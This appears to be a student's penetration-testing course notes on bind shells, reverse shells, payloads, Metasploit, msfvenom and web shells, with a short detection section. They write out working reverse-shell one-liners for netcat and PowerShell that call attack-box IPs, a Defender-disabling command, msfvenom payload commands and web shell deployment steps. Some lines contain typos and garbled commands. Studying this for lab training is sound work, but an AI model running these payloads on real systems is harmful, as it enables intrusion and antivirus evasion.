A shell is a program that provide a computer user with an interface to input instructions into the system and view text output(Bash ,zsh, cmd, powershell) 
A payload can be defined as :
	- networking: encapsulated data portion fo a packet travsersing modern network
	- Basic computing:  A payload is the portio of an instrcution set that defines the action to be taken
	- Programming : the data portion refereneced or carried by the programming language instruction
	- Exploirtaion and security : a payload is a code crafted with the intent to exploit a vulnerability on a computer system
A command line interface is a combination of Operating system , terminal emulator and the command language interpreter
## Bind Shells
A bind shell , the target systrem has a listener started and wawaits a connection from a pentester's system(attack box)
![[Pasted image 20260625220626.png]]
 Practicing with GNU Netcat
 ```
 nc -lvnp 7777 : (server\target starting a netcat listener )
 nc -nv <server ip> <port> : (attack box connecting to the target)
 nc -nv 10.129.41.200 7777
 ```
 **Establishing a basic bind shell with netcat**
	 netcat is use to send text between the client and the server but this is not a bing shell because we cannot interact with the OS and file system.
 ```
 **rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | \bin\bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f** : (server ip) the command above is referred to as a payload and we delivered this manually
 
  nc -nv 10.129.41.200 7777 : (client- connecting to bind shell on the target)
  
 ```
## Reverse Shells
 With reverse shells the attack box will have to listener running and the targetr will need to initiate the connection
 ![[Pasted image 20260625224706.png]]
 ``
```
sudo nc -lvnp 443 : ( server attack box)
```

We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level.
```
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Set-MpPreference -DisableRealTimeMonitoring $true ( disable Antivirus powershell one liner)
```

## Intro tp payloads
In information ecurity the payload is the command and/or code that exploits the vulnerability in an OS and/or application.
 let examine the one the liner 
 
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
  - rm -f: removes the /tmp/f file if it exists 
  - mkfifo /tmp/f; makes a FIFO named pip file at the location specified
  - cat /tmp/f | concatenates the FIFO named pipe file 
  - /bin/bash -i 2>&1 | specifies the command langauge interpreter using the -i option to ensure the shell is interactive  2.&1 ensure both the stderr and stdout are redirected to the command following the pipe
  - nc 10.10.14.12 7777 > /tmp/f uses netcat to send a connection to our attack host 

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 - powershell -nop -c : calling powershell with no profile and execute the command/script block(-c)
 - "$Client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443)" : sets/evaluate the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`
 - #### Setting The Command Stream

`$stream = $client.GetStream();`

Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications. The semi-colon (`;`) ensures the commands & code are executed sequentially.

#### Empty Byte Stream
`[byte[]]$bytes = 0..65535|%{0};`

Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

#### Stream Parameters

`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`

Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.

#### Set The Byte Encoding

`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`

Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (`;`) ensures the commands & code are executed sequentially.

#### Invoke-Expression

`$sendback = (iex $data 2>&1 | Out-String );`

Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard output (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (`;`) ensures the commands & code are executed sequentially.

#### Show Working Directory


`$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`

Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (`;`) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.

#### Sets Sendbyte

`$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`
	
	Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.
	#### Terminate TCP Connection
`$client.Close()"`

This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.

## Automating Payloads & Delivery with Metasploit
```
  sudo msfconsole (starting the metasploit)
  nmap -sCV -Pn 10.129.164.25 rnnning a nmap scan
  search smb ( seatching within metasploit)
  use <no> , option useing and viewing the options of a module
  set rhosts <target ip> etc (setting options)
  exploit/run
```
Keep in mind that Meterpreter is a payload that uses in-memory DLL injection to stealthfully establish a communication channel between an attack box and a target.
## Crafting payloads with MSFvenom
```
 msfvenom -l payloads : (listing the payloads)
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf >      createbackup.elf ( crafting a stageless payload for a linux host)
 sudo nc -lvnp 443 ( nc connection to catch incoming payload connection)
 
 
```
staged payloads create a way for us to send over more components of our attack. like a foundation for something bigger or a bigger exploit to run on.
Stageless payloads do not have a stage.
```
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > <payloadname.extension> : crafting a stageless windows payload
 need to be creaftive because payload in this form will mostly be caught by an AV
```
## Infiltrating Windows
 Few ways to determine if a host is a windows machine :
   - Time to live(ttl) : ttl of 128 or 32 from ping usually indicates a windows machine
   - using nmap scripted scan using option as -O , -A 
   - using banner grabbing script from nse : --script banner.nse
   Payload types to consider:
    - DDLs (Dynamic link library):are used to shared code and data that can be used by many different programs at once. injecting a malicicous ddl or hijacking a vulnearable librayr on the host can elevate our privileges to SYSTEM
    - Batch( .bat) : Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. 
    - VBS script: a lightweight scripting language based on Microsoft's Visual Basic
    - [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer.
    - [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language.
## Infiltrating Unix/Linux
One detail that can be overlooked when relying on MSF to find an exploit module for a specific application is the version of MSF. There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their [repos on github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits). We could do an even more specific search using a search engine: `rConfig 3.9.6 exploit metasploit github`
Most of the time on linux shell we drop shell with no prompt known as non-tty Shell. they have limited functionality and can often prevent our use of essential commands.
To have a better shell we can use python if present on the system 
```
  python -c 'inmport pty; pty.spawn("/bin/bash\sh)'
  spawn a borne shell
```

## Spawing interactive shells

```
 /bin/sh -i : execute the shell interpreter specified in the path
 
 perl -e 'exec "/bin/sh";' : in the case perl is present on the system
 
 ruby: exec "/bin/sh"' : this should be run from a script
 
 lua: os.execute('/bin/sh')
 
 awk 'BEGIN {system("/bin/sh")}' :
 
 find . -exec /bin/sh \; -quit : uses the execute option to initaite the shell 
 interpreter directly
 
 vim -c ':!/bin/sh'
          :set shell=/bin/sh
          ;shell
 sudo -l : used to know permission we have a specific shell
 
 
```

## Introduction to web shells
During our external penetration tests, we most commonly "get in" (gain a foothold inside the internal network) via web application attacks (file upload attacks, SQL injection, RFI/LFI, command injection, etc.), password spraying (against RDS, VPN portals, Citrix, OWA, and other applications using Active Directory authentication), and social engineering.
A web shell is a browser-based shell session we can use to interect with the uderlying operating system of a web server.
# Laudanum, One Webshell to Rule Them All

Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it [here](https://github.com/jbarcia/Web-Shells/tree/master/laudanum). Let's examine Laudanum and see how it works.
Landanum demo
```
 cp /us/share/landanum/aspx/shell.aspx /home/tester/demo.aspx : make a copy
 - add your IP address to the allowedIPS variable and remove the ASCII art and comments
 - Take advantage of the upload function
 - Navigate to the shell to use it 
  
```
One great resource to use in learning is `IPPSEC's` blog site [ippsec.rocks](https://ippsec.rocks/?#).
### ASPX Explained
Active Server Page Extended is a file type/extenion written for microsoft's ASP.NEt Framework.

### Antak webshell
Antak is a web shell built in ASP.net inlcuded within he [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest.

```
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/bryan/upload.aspx 
 make sure to add credential for access to the web shell modify line 14 adding a user and password and use the same procedure as for landanum shelll
```

## Detection and Prevention
When it comes to looking for and identifying active shells, payload delivery and execution, and potential attempts to subvert our defenses, we have many different options to utilize to detect and respond to these events. Before talking about data sources and tools we can use, let's take a second to talk about the [MITRE ATT&CK Framework](https://attack.mitre.org/) and define the techniques and tactics being utilized by attackers. The `ATT&CK Framework` as defined by MITRE, is "`a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations`."